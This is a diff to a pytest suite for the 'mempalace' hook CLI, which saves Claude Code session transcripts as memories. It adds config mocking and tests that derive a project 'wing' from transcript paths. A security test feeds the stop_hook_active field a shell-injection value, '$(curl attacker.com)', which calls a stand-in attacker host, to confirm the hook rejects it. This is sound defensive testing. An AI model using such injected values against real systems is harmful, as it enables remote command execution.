@@ -4,7 +4,7 @@ import json
 import os
 import subprocess
 from pathlib import Path
-from unittest.mock import patch
+from unittest.mock import MagicMock, patch
 
 import pytest
 
@@ -166,11 +166,17 @@ def test_extract_recent_messages_missing_file():
 def _capture_hook_output(hook_fn, data, harness="claude-code", state_dir=None):
     """Run a hook and capture its JSON stdout output."""
     import io
+    from unittest.mock import PropertyMock
 
     buf = io.StringIO()
     patches = [patch("mempalace.hooks_cli._output", side_effect=lambda d: buf.write(json.dumps(d)))]
     if state_dir:
         patches.append(patch("mempalace.hooks_cli.STATE_DIR", state_dir))
+    # Mock MempalaceConfig so tests don't depend on user's ~/.mempalace/config.json
+    mock_config = MagicMock()
+    type(mock_config).hook_silent_save = PropertyMock(return_value=True)
+    type(mock_config).hook_desktop_toast = PropertyMock(return_value=False)
+    patches.append(patch("mempalace.config.MempalaceConfig", return_value=mock_config))
     with contextlib.ExitStack() as stack:
         for p in patches:
             stack.enter_context(p)
@@ -228,7 +234,27 @@ def test_stop_hook_saves_silently_at_interval(tmp_path):
     # Saves silently — systemMessage notification with themes, no block
     assert result["systemMessage"].startswith("\u2726 15 memories woven into the palace")
     assert "hooks" in result["systemMessage"]
-    mock_save.assert_called_once_with(str(transcript), "test", toast=False)
+    # tmp_path has no "-Projects-" segment, so _wing_from_transcript_path falls back to "wing_sessions"
+    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_sessions", toast=False)
+
+
+def test_stop_hook_derives_wing_from_transcript_path(tmp_path):
+    """When transcript path looks like a Claude Code path, wing is derived from it."""
+    project_dir = tmp_path / ".claude" / "projects" / "-home-jp-Projects-myproject"
+    project_dir.mkdir(parents=True)
+    transcript = project_dir / "session.jsonl"
+    _write_transcript(
+        transcript,
+        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
+    )
+    save_result = {"count": 15, "themes": []}
+    with patch("mempalace.hooks_cli._save_diary_direct", return_value=save_result) as mock_save:
+        _capture_hook_output(
+            hook_stop,
+            {"session_id": "test", "stop_hook_active": False, "transcript_path": str(transcript)},
+            state_dir=tmp_path,
+        )
+    mock_save.assert_called_once_with(str(transcript), "test", wing="wing_myproject", toast=False)
 
 
 def test_stop_hook_tracks_save_point(tmp_path):
@@ -274,6 +300,28 @@ def test_precompact_allows(tmp_path):
         state_dir=tmp_path,
     )
     assert result == {}
+
+
+# --- _wing_from_transcript_path ---
+
+
+def test_wing_from_transcript_path_extracts_project():
+    path = "/home/jp/.claude/projects/-home-jp-Projects-memorypalace/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_memorypalace"
+
+
+def test_wing_from_transcript_path_fallback():
+    assert _wing_from_transcript_path("/some/random/path.jsonl") == "wing_sessions"
+
+
+def test_wing_from_transcript_path_windows_backslashes():
+    path = "C:\\Users\\jp\\.claude\\projects\\-home-jp-Projects-myapp\\session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_myapp"
+
+
+def test_wing_from_transcript_path_lowercases():
+    path = "/home/jp/.claude/projects/-home-jp-Projects-MyProject/session.jsonl"
+    assert _wing_from_transcript_path(path) == "wing_myproject"
 
 
 # --- _log ---
@@ -770,33 +818,29 @@ def test_validate_transcript_accepts_platform_native_path(tmp_path):
 
 
 def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
-    """stop_hook_active with shell injection string should not cause issues."""
+    """stop_hook_active with shell injection string should not cause pass-through.
+
+    Verifies the injected value is not treated as truthy — the save path runs
+    instead of being short-circuited. Mocks _save_diary_direct so we can assert
+    it was invoked regardless of silent vs legacy save mode.
+    """
     transcript = tmp_path / "t.jsonl"
     _write_transcript(
         transcript,
         [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
     )
-    # Simulate a malicious stop_hook_active value
-    result = _capture_hook_output(
-        hook_stop,
-        {
-            "session_id": "test",
-            "stop_hook_active": "$(curl attacker.com)",
-            "transcript_path": str(transcript),
-        },
-        state_dir=tmp_path,
-    )
+    with patch(
+        "mempalace.hooks_cli._save_diary_direct", return_value={"count": 1, "themes": []}
+    ) as mock_save:
+        _capture_hook_output(
+            hook_stop,
+            {
+                "session_id": "test",
+                "stop_hook_active": "$(curl attacker.com)",
+                "transcript_path": str(transcript),
+            },
+            state_dir=tmp_path,
+        )
     # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through.
-    # It should count messages and trigger save logic. In legacy block mode that means
-    # decision=block; in the fork's default silent_save mode it means a systemMessage
-    # (or empty output if the save found no messages to persist). Either way, the key
-    # security property is "didn't treat the injected value as true" — i.e. we exercised
-    # the save path rather than short-circuiting to pass-through.
-    is_block = result.get("decision") == "block"
-    is_silent_save = "systemMessage" in result
-    is_empty = result == {}
-    assert is_block or is_silent_save or is_empty, result
-    # Specifically, if it DID decide anything, it must be block (not the pass-through
-    # that would result from treating the injected value as truthy).
-    if "decision" in result:
-        assert result["decision"] == "block"
+    # Save must have been attempted.
+    assert mock_save.called
